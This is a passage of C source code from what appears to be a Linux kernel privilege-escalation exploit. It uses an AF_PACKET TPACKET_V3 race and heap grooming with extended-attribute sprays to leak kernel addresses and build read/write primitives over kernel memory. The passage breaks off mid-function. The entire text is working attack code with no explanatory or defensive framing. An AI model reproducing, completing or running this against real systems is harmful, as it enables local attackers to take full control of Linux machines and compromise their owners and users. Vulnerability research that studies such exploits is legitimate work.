	tpacket_rcv_thread_destroy(nt->tpacket_rcv_thread);
	free(nt);
}

void pages_order2_read_primitive_init(struct pages_order2_read_primitive *primitive)
{
	primitive->drain_pages_order2_packet_socket_1 = Socket(AF_PACKET, SOCK_RAW, 0);
	primitive->drain_pages_order2_packet_socket_2 = Socket(AF_PACKET, SOCK_RAW, 0);
	primitive->drain_pages_order3_packet_socket = Socket(AF_PACKET, SOCK_RAW, 0);

	struct tpacket_req3 tx_ring = {};
	tx_ring.tp_block_size = PAGES_ORDER1_SIZE;
	tx_ring.tp_block_nr = 1;
	tx_ring.tp_frame_size = PAGES_ORDER1_SIZE;
	tx_ring.tp_frame_nr = tx_ring.tp_block_size / tx_ring.tp_frame_size * tx_ring.tp_block_nr;

	struct tpacket_req3 rx_ring = {};
	rx_ring.tp_block_size = PAGES_ORDER3_SIZE;
	rx_ring.tp_block_nr = MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_KMALLOC_16;
	rx_ring.tp_frame_size = PAGES_ORDER3_SIZE;
	rx_ring.tp_frame_nr = rx_ring.tp_block_size / rx_ring.tp_frame_size * rx_ring.tp_block_nr;
	rx_ring.tp_sizeof_priv = 16248;
	rx_ring.tp_retire_blk_tov = USHRT_MAX;

	struct sock_filter filter[MAX_FILTER_LEN] = {};
	for (int i = 0; i < MAX_FILTER_LEN - 1; i++) {
		filter[i].code = BPF_LD | BPF_IMM;
		filter[i].k = 0xcafebabe;
	}

	filter[MAX_FILTER_LEN - 1].code = BPF_RET | BPF_K;
	filter[MAX_FILTER_LEN - 1].k = sizeof(size_t);
	
	primitive->victim_packet_socket_config = victim_packet_socket_config_create(
		(struct __kernel_sock_timeval){ .tv_sec = 1 }, // sndtimeo
		(struct sockaddr_ll){ .sll_family = AF_PACKET, .sll_ifindex = If_nametoindex(DUMMY_INTERFACE_NAME), .sll_protocol = htons(ETH_P_ALL) }, // addr
		tx_ring,	// tx_ring
		rx_ring,	// rx_ring
		1,		// packet_loss
		TPACKET_V3,	// packet_version
		30,		// packet_reserve
		filter		// filter
	);

	struct simple_xattr_request *simple_xattr_request = NULL;

	for (int i = 0; i < TOTAL_PAGES_ORDER2_SIMPLE_XATTR_SPRAY; i++) {
		char value[XATTR_SIZE_MAX] = {};
		char name[XATTR_NAME_MAX + 1] = {};
		snprintf(name, sizeof(name), PAGES_ORDER2_GROOM_SIMPLE_XATTR_NAME_FMT, i);
		snprintf(value, sizeof(value), PAGES_ORDER2_GROOM_SIMPLE_XATTR_VALUE_FMT, i);
		simple_xattr_request = simple_xattr_request_create(
			PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH,
			name,
			value,
			KMALLOC_8K_SIZE
		);

		primitive->simple_xattr_requests[i] = simple_xattr_request;
	}
}

void pages_order2_read_primitive_page_drain(struct pages_order2_read_primitive *primitive)
{
	alloc_pages(primitive->drain_pages_order2_packet_socket_1, 1024, PAGES_ORDER2_SIZE);
	alloc_pages(primitive->drain_pages_order3_packet_socket, 1024, PAGES_ORDER3_SIZE);
	alloc_pages(primitive->drain_pages_order2_packet_socket_2, 1024, PAGES_ORDER2_SIZE);
}

void pages_order2_read_primitive_page_drain_cleanup(struct pages_order2_read_primitive *primitive)
{
	free_pages(primitive->drain_pages_order2_packet_socket_1);
	free_pages(primitive->drain_pages_order2_packet_socket_2);
}

void pages_order2_read_primitive_setup_simple_xattr(struct pages_order2_read_primitive *primitive)
{
	free_pages(primitive->drain_pages_order3_packet_socket);
	
	for (int i = 0; i < ARRAY_SIZE(primitive->simple_xattr_requests); i++) {
		Setxattr(
			primitive->simple_xattr_requests[i]->filepath,
			primitive->simple_xattr_requests[i]->name,
			primitive->simple_xattr_requests[i]->value,
			primitive->simple_xattr_requests[i]->value_size,
			XATTR_CREATE
		);

		primitive->simple_xattr_requests[i]->allocated = true;
	}

	for (int i = 512; i < ARRAY_SIZE(primitive->simple_xattr_requests); i += 128) {
		Removexattr(
			primitive->simple_xattr_requests[i]->filepath,
			primitive->simple_xattr_requests[i]->name
		);

		primitive->simple_xattr_requests[i]->allocated = false;
	}
}

void pages_order2_read_primitive_cleanup_simple_xattr(struct pages_order2_read_primitive *primitive)
{
	for (int i = 0; i < ARRAY_SIZE(primitive->simple_xattr_requests); i++) {
		if (primitive->simple_xattr_requests[i] && primitive->simple_xattr_requests[i]->allocated) {
			Removexattr(
				primitive->simple_xattr_requests[i]->filepath,
				primitive->simple_xattr_requests[i]->name
			);

			primitive->simple_xattr_requests[i]->allocated = false;
		}
	}
}

void pages_order2_read_primitive_main_work(
	struct pages_order2_read_primitive *primitive,
	struct necessary_threads *necessary_threads,
	int timerfd,
	int configure_network_interface_socket,
	struct timespec timer_interrupt_amplitude,
	struct timespec decrease_tpacket_rcv_thread_sleep_time
)
{
	u8 packet_data[128] = {};
	int dummy_ifindex = If_nametoindex(DUMMY_INTERFACE_NAME);
	*(size_t *)(packet_data) = XATTR_SIZE_MAX;
	
	struct pg_vec_lock_thread_work *pg_vec_lock_thread_work = NULL;
	struct pg_vec_buffer_thread_work *pg_vec_buffer_thread_work = NULL;
	struct tpacket_rcv_thread_work *tpacket_rcv_thread_work = NULL;
	struct tpacket_rcv_thread_work_result *tpacket_rcv_thread_work_result = NULL;
	struct msghdr *msghdr = NULL;

	struct victim_packet_socket_config *victim_packet_socket_config = primitive->victim_packet_socket_config;
	struct timespec pg_vec_lock_timeout = {
		.tv_sec = victim_packet_socket_config->sndtimeo.tv_sec,
		.tv_nsec = victim_packet_socket_config->sndtimeo.tv_usec * NSEC_PER_USEC
	};

	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	struct victim_packet_socket *victim_packet_socket = victim_packet_socket_create(victim_packet_socket_config);
	pg_vec_lock_thread_work = pg_vec_lock_thread_work_create(victim_packet_socket, dummy_ifindex);
	pg_vec_buffer_thread_work = pg_vec_buffer_thread_work_create(victim_packet_socket, true, false);
	msghdr = msghdr_create(packet_data, sizeof(packet_data), DUMMY_INTERFACE_NAME);
	pages_order2_read_primitive_page_drain(primitive);
	victim_packet_socket_configure(victim_packet_socket);
	pages_order2_read_primitive_setup_simple_xattr(primitive);

	pg_vec_lock_thread_send_work(necessary_threads->pg_vec_lock_thread, pg_vec_lock_thread_work);
	struct timespec pg_vec_lock_acquire_time = pg_vec_lock_thread_wait_in_work(necessary_threads->pg_vec_lock_thread);
	network_interface_down(configure_network_interface_socket, DUMMY_INTERFACE_NAME);
	pg_vec_buffer_thread_send_work(necessary_threads->pg_vec_buffer_thread, pg_vec_buffer_thread_work);
	pg_vec_buffer_thread_wait_in_work(necessary_threads->pg_vec_buffer_thread);
	network_interface_up(configure_network_interface_socket, DUMMY_INTERFACE_NAME);
	struct timespec pg_vec_lock_release_time = timespec_add(pg_vec_lock_acquire_time, pg_vec_lock_timeout);
	pin_thread_on_cpu(CPU_NUMBER_ONE);
	struct itimerspec settime_value = {};
	settime_value.it_value = timespec_add(pg_vec_lock_release_time, timer_interrupt_amplitude);
	Timerfd_settime(timerfd, TFD_TIMER_ABSTIME, &settime_value, NULL);

	tpacket_rcv_thread_work = tpacket_rcv_thread_work_create(pg_vec_lock_release_time, decrease_tpacket_rcv_thread_sleep_time, msghdr);
	tpacket_rcv_thread_send_work(necessary_threads->tpacket_rcv_thread, tpacket_rcv_thread_work);
	tpacket_rcv_thread_wait_work_complete(necessary_threads->tpacket_rcv_thread);
	pg_vec_buffer_thread_wait_work_complete(necessary_threads->pg_vec_buffer_thread);
	pg_vec_lock_thread_wait_work_complete(necessary_threads->pg_vec_lock_thread);
	pg_vec_buffer_thread_work = pg_vec_buffer_thread_work_create(NULL, false, true);
	pg_vec_buffer_thread_send_work(necessary_threads->pg_vec_buffer_thread, pg_vec_buffer_thread_work);
	pg_vec_buffer_thread_wait_work_complete(necessary_threads->pg_vec_buffer_thread);	
	victim_packet_socket_destroy(victim_packet_socket);
}

bool pages_order2_read_primitive_build_primitive(
	struct pages_order2_read_primitive *primitive,
	struct necessary_threads *necessary_threads,
	int configure_network_interface_socket,
	int timerfd,
	struct timespec decrease_tpacket_rcv_thread_sleep_time,
	struct timespec timer_interrupt_amplitude
)
{
	pages_order2_read_primitive_main_work(
		primitive,
		necessary_threads,
		timerfd,
		configure_network_interface_socket,
		decrease_tpacket_rcv_thread_sleep_time,
		timer_interrupt_amplitude
	);

	struct simple_xattr_request *overflowed_request = NULL;
	struct simple_xattr_request *simple_xattr_request = NULL;
	bool overflow_success = false;

	for (int i = 0; i < TOTAL_PAGES_ORDER2_SIMPLE_XATTR_SPRAY && !overflow_success; i++) {
		char value[KMALLOC_8K_SIZE] = {};
		
		simple_xattr_request = primitive->simple_xattr_requests[i];
		if (!simple_xattr_request)
			continue;

		ssize_t getxattr_ret = getxattr(
			simple_xattr_request->filepath,
			simple_xattr_request->name,
			value,
			KMALLOC_8K_SIZE
		);

		if (getxattr_ret < 0 && errno == ERANGE) {
			primitive->overflowed_simple_xattr_request = simple_xattr_request;
			primitive->simple_xattr_requests[i] = NULL;
			overflow_success = true;
		}
	}

	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	pages_order2_read_primitive_page_drain_cleanup(primitive);

	if (!overflow_success) {
		pages_order2_read_primitive_cleanup_simple_xattr(primitive);
	} else {
		Close(primitive->drain_pages_order2_packet_socket_1);
		primitive->drain_pages_order2_packet_socket_1 = -1;
		Close(primitive->drain_pages_order2_packet_socket_2);
		primitive->drain_pages_order2_packet_socket_2 = -1;
		Close(primitive->drain_pages_order3_packet_socket);
		primitive->drain_pages_order3_packet_socket = -1;
	}

	return overflow_success;
}

struct pages_order2_read_primitive pages_order2_read_primitive_build(
	struct necessary_threads *necessary_threads,
	int configure_network_interface_socket,
	int timerfd
)
{
	struct pages_order2_read_primitive pages_order2_read_primitive = {};
	pages_order2_read_primitive_init(&pages_order2_read_primitive);

	struct timespec pages_order2_read_primitive_sleep_decrease_amplitude = { .tv_nsec = 5000 };
	struct timespec pages_order2_read_primitive_timer_interrupt_amplitude = { .tv_nsec = 130000 };

	bool pages_order2_read_primitive_build_success = false;
	while (!pages_order2_read_primitive_build_success) {
		pages_order2_read_primitive_build_success = pages_order2_read_primitive_build_primitive(
			&pages_order2_read_primitive,
			necessary_threads,
			configure_network_interface_socket,
			timerfd,
			pages_order2_read_primitive_sleep_decrease_amplitude,
			pages_order2_read_primitive_timer_interrupt_amplitude
		);
	}

	return pages_order2_read_primitive;
}

void *pages_order2_read_primitive_trigger(struct pages_order2_read_primitive *pages_order2_read_primitive)
{
	void *leak_data = Calloc(1, XATTR_SIZE_MAX);
	Getxattr(
		pages_order2_read_primitive->overflowed_simple_xattr_request->filepath,
		pages_order2_read_primitive->overflowed_simple_xattr_request->name,
		leak_data,
		XATTR_SIZE_MAX
	);

	return leak_data;
}

bool pages_order2_read_primitive_build_leaked_simple_xattr(struct pages_order2_read_primitive *pages_order2_read_primitive)
{
	void *tmp = pages_order2_read_primitive_trigger(pages_order2_read_primitive);
	struct simple_xattr *leaked_simple_xattrs = tmp + PAGES_ORDER2_SIZE - sizeof(struct simple_xattr);
	struct simple_xattr *leaked_simple_xattr = NULL;
	int leaked_simple_xattr_count = (XATTR_SIZE_MAX - (PAGES_ORDER2_SIZE - sizeof(struct simple_xattr))) / PAGES_ORDER2_SIZE;
	int simple_xattr_requests_idx = -1;
	int leaked_simple_xattrs_idx = -1;
	bool found_leaked_simple_xattr = false;

	for (int i = 0; i < leaked_simple_xattr_count && !found_leaked_simple_xattr; i++) {
		leaked_simple_xattr = &leaked_simple_xattrs[i];

		if (!is_data_look_like_simple_xattr(leaked_simple_xattr, KMALLOC_8K_SIZE))
			continue;
		else {
			simple_xattr_dump(leaked_simple_xattr);
		}
		
		u8 *leaked_simple_xattr_value = leaked_simple_xattr->value;

		if (
			strncmp(
				leaked_simple_xattr_value,
				PAGES_ORDER2_GROOM_SIMPLE_XATTR_VALUE_BEGIN,
				strlen(PAGES_ORDER2_GROOM_SIMPLE_XATTR_VALUE_BEGIN)
			) != 0
		) {
			continue;
		}

		if (sscanf(leaked_simple_xattr_value, PAGES_ORDER2_GROOM_SIMPLE_XATTR_VALUE_FMT, &simple_xattr_requests_idx) != 1)
			continue;

		if (simple_xattr_requests_idx < 0 || simple_xattr_requests_idx >= TOTAL_PAGES_ORDER2_SIMPLE_XATTR_SPRAY)
			continue;

		pages_order2_read_primitive->leaked_content_simple_xattr_request = pages_order2_read_primitive->simple_xattr_requests[simple_xattr_requests_idx];
		pages_order2_read_primitive->simple_xattr_requests[simple_xattr_requests_idx] = NULL;
		leaked_simple_xattrs_idx = i;
		found_leaked_simple_xattr = true;		
	}

	if (!found_leaked_simple_xattr) {
		free(tmp);

		Removexattr(
			pages_order2_read_primitive->overflowed_simple_xattr_request->filepath,
			pages_order2_read_primitive->overflowed_simple_xattr_request->name
		);

		simple_xattr_request_destroy(pages_order2_read_primitive->overflowed_simple_xattr_request);
		pages_order2_read_primitive->overflowed_simple_xattr_request = NULL;

		pages_order2_read_primitive_cleanup_simple_xattr(pages_order2_read_primitive);
		return false;
	}

	for (int i = 0; i < TOTAL_PAGES_ORDER2_SIMPLE_XATTR_SPRAY; i++) {
		if (pages_order2_read_primitive->simple_xattr_requests[i] && pages_order2_read_primitive->simple_xattr_requests[i]->allocated) {
			Removexattr(
				pages_order2_read_primitive->simple_xattr_requests[i]->filepath,
				pages_order2_read_primitive->simple_xattr_requests[i]->name
			);

			pages_order2_read_primitive->simple_xattr_requests[i]->allocated = false;
		}
	}

	free(tmp);
	tmp = pages_order2_read_primitive_trigger(pages_order2_read_primitive);
	leaked_simple_xattrs = tmp + PAGES_ORDER2_SIZE - sizeof(struct simple_xattr);
	leaked_simple_xattr = &leaked_simple_xattrs[leaked_simple_xattrs_idx];

	u64 next = (u64)(leaked_simple_xattr->list.next);
	u64 prev = (u64)(leaked_simple_xattr->list.prev);
	printf("next: 0x%016lx\n", next);
	printf("prev: 0x%016lx\n", prev);
	
	if ((next & (PAGES_ORDER2_SIZE - 1)) == 0) {
		pages_order2_read_primitive->overflowed_simple_xattr_kernel_address = next;
		pages_order2_read_primitive->leaked_content_simple_xattr_kernel_address = pages_order2_read_primitive->overflowed_simple_xattr_kernel_address + (leaked_simple_xattrs_idx + 1) * PAGES_ORDER2_SIZE;
	} else if ((prev & (PAGES_ORDER2_SIZE - 1)) == 0) {
		pages_order2_read_primitive->overflowed_simple_xattr_kernel_address = prev;
		pages_order2_read_primitive->leaked_content_simple_xattr_kernel_address = pages_order2_read_primitive->overflowed_simple_xattr_kernel_address + (leaked_simple_xattrs_idx + 1) * PAGES_ORDER2_SIZE;
	}

	printf("[DEBUG] pages_order2_read_primitive->overflowed_simple_xattr_kernel_address: 0x%016lx\n", pages_order2_read_primitive->overflowed_simple_xattr_kernel_address);
	printf("[DEBUG] pages_order2_read_primitive->leaked_content_simple_xattr_kernel_address: 0x%016lx\n", pages_order2_read_primitive->leaked_content_simple_xattr_kernel_address);

	free(tmp);
	return true;
}

void simple_xattr_read_write_primitive_init(struct simple_xattr_read_write_primitive *primitive)
{
	primitive->drain_pages_order2_packet_socket_1 = Socket(AF_PACKET, SOCK_RAW, 0);
	primitive->drain_pages_order2_packet_socket_2 = Socket(AF_PACKET, SOCK_RAW, 0);
	primitive->drain_pages_order3_packet_socket = Socket(AF_PACKET, SOCK_RAW, 0);

	for (int i = 0; i < ARRAY_SIZE(primitive->spray_pg_vec_packet_sockets); i++)
		primitive->spray_pg_vec_packet_sockets[i] = Socket(AF_PACKET, SOCK_RAW, 0);

	primitive->overflowed_pg_vec_packet_socket = Socket(AF_PACKET, SOCK_RAW, 0);

	struct tpacket_req3 tx_ring = {};
	tx_ring.tp_block_size = PAGES_ORDER1_SIZE;
	tx_ring.tp_block_nr = 1;
	tx_ring.tp_frame_size = PAGES_ORDER1_SIZE;
	tx_ring.tp_frame_nr = tx_ring.tp_block_size / tx_ring.tp_frame_size * tx_ring.tp_block_nr;

	struct tpacket_req3 rx_ring = {};
	rx_ring.tp_block_size = PAGES_ORDER3_SIZE;
	rx_ring.tp_block_nr = MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_KMALLOC_16;
	rx_ring.tp_frame_size = PAGES_ORDER3_SIZE;
	rx_ring.tp_frame_nr = rx_ring.tp_block_size / rx_ring.tp_frame_size * rx_ring.tp_block_nr;
	rx_ring.tp_sizeof_priv = 16248;
	rx_ring.tp_retire_blk_tov = USHRT_MAX;

	struct sock_filter filter[MAX_FILTER_LEN] = {};
	for (int i = 0; i < MAX_FILTER_LEN - 1; i++) {
		filter[i].code = BPF_LD | BPF_IMM;
		filter[i].k = 0xcafebabe;
	}

	filter[MAX_FILTER_LEN - 1].code = BPF_RET | BPF_K;
	filter[MAX_FILTER_LEN - 1].k = sizeof(void *);
	
	primitive->victim_packet_socket_config = victim_packet_socket_config_create(
		(struct __kernel_sock_timeval){ .tv_sec = 1 }, // sndtimeo
		(struct sockaddr_ll){ .sll_family = AF_PACKET, .sll_ifindex = If_nametoindex(DUMMY_INTERFACE_NAME), .sll_protocol = htons(ETH_P_ALL) }, // addr
		tx_ring,	// tx_ring
		rx_ring,	// rx_ring
		1,		// packet_loss
		TPACKET_V3,	// packet_version
		30,		// packet_reserve
		filter		// filter
	);
}

void simple_xattr_read_write_primitive_page_drain(struct simple_xattr_read_write_primitive *primitive)
{
	alloc_pages(primitive->drain_pages_order2_packet_socket_1, 128, PAGES_ORDER2_SIZE);
	alloc_pages(primitive->drain_pages_order3_packet_socket, 64, PAGES_ORDER3_SIZE);
	alloc_pages(primitive->drain_pages_order2_packet_socket_2, 128, PAGES_ORDER2_SIZE);
}

void simple_xattr_read_write_primitive_setup_pg_vec(struct simple_xattr_read_write_primitive *primitive)
{
	free_pages(primitive->drain_pages_order3_packet_socket);

	for (int i = 0; i < ARRAY_SIZE(primitive->spray_pg_vec_packet_sockets); i++) {
		alloc_pages(primitive->spray_pg_vec_packet_sockets[i], MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2, PAGE_SIZE);
		primitive->spray_pg_vec_packet_sockets_state[i] = 1;
	}

	for (int i = 64, free_count = 0; i < ARRAY_SIZE(primitive->spray_pg_vec_packet_sockets) && free_count < 6; i += 16, free_count++) {
		free_pages(primitive->spray_pg_vec_packet_sockets[i]);
		primitive->spray_pg_vec_packet_sockets_state[i] = 0;
	}
}

void simple_xattr_read_write_primitive_page_drain_cleanup(struct simple_xattr_read_write_primitive *primitive)
{
	free_pages(primitive->drain_pages_order2_packet_socket_1);
	free_pages(primitive->drain_pages_order2_packet_socket_2);
}

void simple_xattr_read_write_primitive_pg_vec_cleanup(struct simple_xattr_read_write_primitive *primitive)
{
	for (int i = 0; i < ARRAY_SIZE(primitive->spray_pg_vec_packet_sockets); i++) {
		if (primitive->spray_pg_vec_packet_sockets_state[i] && primitive->spray_pg_vec_packet_sockets[i] != -1) {
			free_pages(primitive->spray_pg_vec_packet_sockets[i]);
			primitive->spray_pg_vec_packet_sockets_state[i] = 0;
		}
	}
}

void simple_xattr_read_write_primitive_main_work(
	struct simple_xattr_read_write_primitive *primitive,
	struct necessary_threads *necessary_threads,
	int timerfd,
	int configure_network_interface_socket,
	struct timespec timer_interrupt_amplitude,
	struct timespec decrease_tpacket_rcv_thread_sleep_time,
	u64 simple_xattr_kernel_address
)
{
	u8 packet_data[128] = {};
	int dummy_ifindex = If_nametoindex(DUMMY_INTERFACE_NAME);
	*(u64 *)(packet_data) = simple_xattr_kernel_address;

	struct pg_vec_lock_thread_work *pg_vec_lock_thread_work = NULL;
	struct pg_vec_buffer_thread_work *pg_vec_buffer_thread_work = NULL;
	struct tpacket_rcv_thread_work *tpacket_rcv_thread_work = NULL;
	struct tpacket_rcv_thread_work_result *tpacket_rcv_thread_work_result = NULL;
	struct msghdr *msghdr = NULL;

	struct victim_packet_socket_config *victim_packet_socket_config = primitive->victim_packet_socket_config;
	struct timespec pg_vec_lock_timeout = {
		.tv_sec = victim_packet_socket_config->sndtimeo.tv_sec,
		.tv_nsec = victim_packet_socket_config->sndtimeo.tv_usec * NSEC_PER_USEC	
	};

	struct victim_packet_socket *victim_packet_socket = victim_packet_socket_create(victim_packet_socket_config);
	pg_vec_lock_thread_work = pg_vec_lock_thread_work_create(victim_packet_socket, dummy_ifindex);
	pg_vec_buffer_thread_work = pg_vec_buffer_thread_work_create(victim_packet_socket, true, false);
	msghdr = msghdr_create(packet_data, sizeof(packet_data), DUMMY_INTERFACE_NAME);

	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	simple_xattr_read_write_primitive_page_drain(primitive);
	victim_packet_socket_configure(victim_packet_socket);
	simple_xattr_read_write_primitive_setup_pg_vec(primitive);
	pg_vec_lock_thread_send_work(necessary_threads->pg_vec_lock_thread, pg_vec_lock_thread_work);
	struct timespec pg_vec_lock_acquire_time = pg_vec_lock_thread_wait_in_work(necessary_threads->pg_vec_lock_thread);
	network_interface_down(configure_network_interface_socket, DUMMY_INTERFACE_NAME);
	pg_vec_buffer_thread_send_work(necessary_threads->pg_vec_buffer_thread, pg_vec_buffer_thread_work);
	pg_vec_buffer_thread_wait_in_work(necessary_threads->pg_vec_buffer_thread);
	network_interface_up(configure_network_interface_socket, DUMMY_INTERFACE_NAME);
	struct timespec pg_vec_lock_release_time = timespec_add(pg_vec_lock_acquire_time, pg_vec_lock_timeout);

	pin_thread_on_cpu(CPU_NUMBER_ONE);
	struct itimerspec settime_value = {};
	settime_value.it_value = timespec_add(pg_vec_lock_release_time, timer_interrupt_amplitude);
	Timerfd_settime(timerfd, TFD_TIMER_ABSTIME, &settime_value, NULL);

	tpacket_rcv_thread_work = tpacket_rcv_thread_work_create(pg_vec_lock_release_time, decrease_tpacket_rcv_thread_sleep_time, msghdr);
	tpacket_rcv_thread_send_work(necessary_threads->tpacket_rcv_thread, tpacket_rcv_thread_work);
	tpacket_rcv_thread_wait_work_complete(necessary_threads->tpacket_rcv_thread);
	pg_vec_buffer_thread_wait_work_complete(necessary_threads->pg_vec_buffer_thread);
	pg_vec_lock_thread_wait_work_complete(necessary_threads->pg_vec_lock_thread);	
	pg_vec_buffer_thread_work = pg_vec_buffer_thread_work_create(NULL, false, true);
	pg_vec_buffer_thread_send_work(necessary_threads->pg_vec_buffer_thread, pg_vec_buffer_thread_work);
	pg_vec_buffer_thread_wait_work_complete(necessary_threads->pg_vec_buffer_thread);
	victim_packet_socket_destroy(victim_packet_socket);
}

bool simple_xattr_read_write_primitive_build_primitive(
	struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive,
	struct pages_order2_read_primitive *pages_order2_read_primitive,
	struct necessary_threads *necessary_threads,
	int timerfd,
	int configure_network_interface_socket,
        struct timespec decrease_tpacket_rcv_thread_sleep_time,
	struct timespec timer_interrupt_amplitude
)
{
	simple_xattr_read_write_primitive_main_work(
		simple_xattr_read_write_primitive,
		necessary_threads,
		timerfd,
		configure_network_interface_socket,
		timer_interrupt_amplitude,
		decrease_tpacket_rcv_thread_sleep_time,
		pages_order2_read_primitive->leaked_content_simple_xattr_kernel_address
	);

	bool overflow_success = false;
	for (int i = 0; i < ARRAY_SIZE(simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets) && !overflow_success; i++) {
		if (simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets_state[i] == 0)
			continue;

		u64 mmap_size = MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2 * PAGE_SIZE;
		void *mem = Mmap(
			NULL,
			mmap_size,
			PROT_READ | PROT_WRITE,
			MAP_SHARED,
			simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets[i],
			0
		);

		struct simple_xattr *simple_xattr = mem + 3 * PAGE_SIZE;
		if (is_data_look_like_simple_xattr(simple_xattr, KMALLOC_8K_SIZE)) {
			simple_xattr_dump(simple_xattr);
			simple_xattr_read_write_primitive->overflowed_pg_vec_packet_socket = simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets[i];
			simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets[i] = -1;
			simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets_state[i] = 0;
			simple_xattr_read_write_primitive->manipulated_simple_xattr_request = pages_order2_read_primitive->leaked_content_simple_xattr_request;
			pages_order2_read_primitive->leaked_content_simple_xattr_request = NULL;
			overflow_success = true;
		}

		Munmap(mem, mmap_size);
	}

	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	simple_xattr_read_write_primitive_page_drain_cleanup(simple_xattr_read_write_primitive);
	simple_xattr_read_write_primitive_pg_vec_cleanup(simple_xattr_read_write_primitive);

	if (overflow_success) {
		for (int i = 0; i < ARRAY_SIZE(simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets); i++) {
			if (simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets[i] != -1) {
				Close(simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets[i]);
				simple_xattr_read_write_primitive->spray_pg_vec_packet_sockets[i] = -1;
			}
		}
	}

	return overflow_success;
}

struct simple_xattr *simple_xattr_read_write_primitive_mmap(struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive)
{
	u64 mmap_size = MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2 * PAGE_SIZE;
	simple_xattr_read_write_primitive->mmap_address = Mmap(
		NULL,
		mmap_size,
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		simple_xattr_read_write_primitive->overflowed_pg_vec_packet_socket,
		0
	);

	struct simple_xattr *simple_xattr = simple_xattr_read_write_primitive->mmap_address + 3 * PAGE_SIZE;
	return simple_xattr;

}

void simple_xattr_read_write_primitive_munmap(struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive)
{
	u64 mmap_size = MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2 * PAGE_SIZE;
	Munmap(simple_xattr_read_write_primitive->mmap_address, mmap_size);
	simple_xattr_read_write_primitive->mmap_address = NULL;
}

void abr_page_read_write_primitive_build_primitive(
	struct abr_page_read_write_primitive *abr_page_read_write_primitive,
	struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive,
	struct pages_order2_read_primitive *pages_order2_read_primitive
)
{
	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	Removexattr(
		pages_order2_read_primitive->overflowed_simple_xattr_request->filepath,
		pages_order2_read_primitive->overflowed_simple_xattr_request->name
	);

	simple_xattr_request_destroy(pages_order2_read_primitive->overflowed_simple_xattr_request);
	pages_order2_read_primitive->overflowed_simple_xattr_request = NULL;

	ssize_t getxattr_ret = 0;
	u8 value_set[XATTR_SIZE_MAX] = {};
	u8 value_get[XATTR_SIZE_MAX] = {};
	struct simple_xattr *manipulated_simple_xattr = simple_xattr_read_write_primitive_mmap(simple_xattr_read_write_primitive);
	u64 original_manipulated_simple_xattr_name_pointer = (u64)(manipulated_simple_xattr->name);
	u64 original_manipulated_simple_xattr_list_next_pointer = (u64)(manipulated_simple_xattr->list.next);
	u64 fake_simple_xattr_name_addr = 0;
	u64 fake_simple_xattr_addr = 0;
	int overwritten_pg_vec_packet_socket = Socket(AF_PACKET, SOCK_RAW, 0);
	bool abr_page_read_write_primitive_build_success = false;

	while (!abr_page_read_write_primitive_build_success) {
		bool fake_simple_xattr_name_success = false;
		int fake_simple_xattr_name_packet_socket = Socket(AF_PACKET, SOCK_RAW, 0);

		while (!fake_simple_xattr_name_success) {
			Setxattr(
				simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
				LEAK_PAGES_ORDER2_FOR_FAKE_SIMPLE_XATTR_NAME__SIMPLE_XATTR_NAME,
				value_set,
				KMALLOC_8K_SIZE,
				XATTR_CREATE
			);

			fake_simple_xattr_name_addr = (u64)manipulated_simple_xattr->list.prev;
			fprintf(stderr, "fake_simple_xattr_name_addr: 0x%016lx\n", fake_simple_xattr_name_addr);
			
			Removexattr(
				simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
				LEAK_PAGES_ORDER2_FOR_FAKE_SIMPLE_XATTR_NAME__SIMPLE_XATTR_NAME
			);

			alloc_pages(fake_simple_xattr_name_packet_socket, 1, PAGES_ORDER2_SIZE);
			void *mem = Mmap(NULL, 1 * PAGES_ORDER2_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fake_simple_xattr_name_packet_socket, 0);
			strcpy(mem, FAKE_SIMPLE_XATTR_NAME);
			Munmap(mem, 1 * PAGES_ORDER2_SIZE);
			manipulated_simple_xattr->name = (char *)(fake_simple_xattr_name_addr);

			getxattr_ret = getxattr(
				simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
				FAKE_SIMPLE_XATTR_NAME,
				value_get,
				manipulated_simple_xattr->size
			);

			if (getxattr_ret == manipulated_simple_xattr->size) {
				fake_simple_xattr_name_success = true;
			}

			manipulated_simple_xattr->name = (char *)original_manipulated_simple_xattr_name_pointer;
		}

		fprintf(stderr, "fake_simple_xattr_name_success\n");

		bool fake_simple_xattr_success = false;
		int fake_simple_xattr_packet_socket = Socket(AF_PACKET, SOCK_RAW, 0);

		while (!fake_simple_xattr_success) {
			Setxattr(
				simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
				LEAK_PAGES_ORDER2_FOR_FAKE_SIMPLE_XATTR__SIMPLE_XATTR_NAME,
				value_set,
				KMALLOC_8K_SIZE,
				XATTR_CREATE
			);
			
			fake_simple_xattr_addr = (u64)manipulated_simple_xattr->list.prev;
			fprintf(stderr, "fake_simple_xattr_addr: 0x%016lx\n", fake_simple_xattr_addr);

			Removexattr(
				simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
				LEAK_PAGES_ORDER2_FOR_FAKE_SIMPLE_XATTR__SIMPLE_XATTR_NAME
			);

